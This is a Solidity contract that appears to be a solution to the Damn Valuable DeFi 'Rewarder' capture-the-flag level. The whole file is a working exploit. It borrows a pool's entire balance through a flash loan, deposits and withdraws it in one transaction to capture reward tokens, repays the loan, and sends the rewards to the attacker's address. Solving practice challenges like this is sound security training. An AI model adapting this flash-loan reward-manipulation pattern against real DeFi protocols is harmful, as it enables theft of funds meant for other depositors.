// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

interface IRewardPool{
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
}

interface IFlashPool{
    function flashLoan(uint256 amount) external;
}

contract RewarderAttack{

    DamnValuableToken liquidityToken;
    ERC20 rewardToken;
    IRewardPool rewardPool;
    IFlashPool flashPool;

    constructor(
        DamnValuableToken _liquidityToken,
        ERC20 _rewardToken,
        IRewardPool _rewardPool,
        IFlashPool _flashpool
    ) {
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        rewardPool = _rewardPool;
        flashPool = _flashpool;
    }

    function attack() external {
        
        //get pool balance
        uint256 _poolBal = liquidityToken.balanceOf(address(flashPool));

        //approve the reward pool
        liquidityToken.approve(address(rewardPool), _poolBal);

        //take flashLoan
        flashPool.flashLoan(_poolBal);

        //transfer the rewards to attackerEOA
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));

    }

    function receiveFlashLoan(uint256 _amount) external {
        rewardPool.deposit(_amount);
        rewardPool.withdraw(_amount);

        //payback the flashLoan
        liquidityToken.transfer(address(flashPool), _amount);
        
    }
}